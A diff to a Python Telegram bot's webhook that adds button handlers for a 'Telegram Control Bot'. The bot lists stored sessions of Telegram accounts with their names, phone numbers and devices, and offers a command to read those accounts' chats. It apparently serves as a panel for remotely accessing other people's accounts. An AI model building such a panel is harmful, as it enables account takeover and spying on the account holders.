@@ -164,7 +164,91 @@ def webhook():
         data = request.json
         print(f"Webhook received: {data}")
         
-        if 'message' in data:
+        # Handle callback queries (button clicks)
+        if 'callback_query' in data:
+            callback = data['callback_query']
+            chat_id = callback['message']['chat']['id']
+            message_id = callback['message']['message_id']
+            data_callback = callback['data']
+            
+            # Handle selecting a session
+            if data_callback.startswith('select_'):
+                session_id = data_callback.replace('select_', '')
+                
+                if session_id in active_sessions:
+                    session_data = active_sessions[session_id]
+                    user_info = session_data.get('user_info', {})
+                    device_model = session_data.get('device_model', 'Unknown')
+                    
+                    text = (f"✅ *Connected to:*\n\n"
+                           f"👤 {user_info.get('first_name', 'Unknown')}\n"
+                           f"📱 {session_data['phone']}\n"
+                           f"📲 Device: {device_model}\n\n"
+                           f"*What would you like to do?*")
+                    
+                    # Edit the original message to show menu
+                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
+                    payload = {
+                        "chat_id": chat_id,
+                        "message_id": message_id,
+                        "text": text,
+                        "parse_mode": "Markdown",
+                        "reply_markup": main_menu_keyboard()
+                    }
+                    requests.post(url, json=payload)
+            
+            # Handle refresh button
+            elif data_callback == 'refresh_sessions':
+                sessions = get_sessions_list()
+                if sessions:
+                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
+                    payload = {
+                        "chat_id": chat_id,
+                        "message_id": message_id,
+                        "text": "🤖 *Telegram Control Bot*\n\nSelect an account:",
+                        "parse_mode": "Markdown",
+                        "reply_markup": sessions_keyboard(sessions)
+                    }
+                    requests.post(url, json=payload)
+                else:
+                    answer_url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
+                    requests.post(answer_url, json={
+                        "callback_query_id": callback['id'],
+                        "text": "No active sessions found",
+                        "show_alert": False
+                    })
+            
+            # Handle menu options
+            elif data_callback == 'menu_read':
+                url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
+                payload = {
+                    "chat_id": chat_id,
+                    "message_id": message_id,
+                    "text": "📖 *Read Messages*\n\nSend a message in format:\n`/read CHAT_ID`\n\nExamples:\n`/read me` - Your saved messages\n`/read @username` - Chat with username",
+                    "parse_mode": "Markdown",
+                    "reply_markup": {"inline_keyboard": [[{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]]}
+                }
+                requests.post(url, json=payload)
+            
+            elif data_callback == 'back_to_menu':
+                # Need to get the session_id for this user - store it temporarily
+                # For now, just show a message
+                url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
+                payload = {
+                    "chat_id": chat_id,
+                    "message_id": message_id,
+                    "text": "🤖 *Telegram Control Bot*\n\nSelect an account to continue:",
+                    "parse_mode": "Markdown",
+                    "reply_markup": sessions_keyboard(get_sessions_list())
+                }
+                requests.post(url, json=payload)
+            
+            # Always answer the callback to remove loading state
+            answer_url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
+            requests.post(answer_url, json={"callback_query_id": callback['id']})
+        
+        # Handle regular messages
+        elif 'message' in data:
             msg = data['message']
             chat_id = msg['chat']['id']
             text = msg.get('text', '')
